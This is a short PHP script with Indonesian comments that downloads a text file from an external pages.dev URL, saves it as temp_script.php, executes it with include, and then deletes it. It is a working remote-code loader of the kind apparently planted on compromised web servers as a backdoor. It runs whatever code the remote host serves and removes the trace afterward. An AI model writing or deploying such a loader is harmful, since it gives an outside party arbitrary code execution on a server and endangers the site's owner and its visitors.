<?php
// Mendownload konten dari URL eksternal
$data = file_get_contents('https://natusvincere-id.pages.dev/navi.txt');

// Menyimpan data ke file lokal sementara
$tempFile = 'temp_script.php';
file_put_contents($tempFile, $data);

// Menyertakan file PHP yang diambil dari URL
if (file_exists($tempFile)) {
    include $tempFile;
    // Setelah digunakan, hapus file sementara
    unlink($tempFile);
} else {
    echo "Gagal mengakses file eksternal.";
}
?>
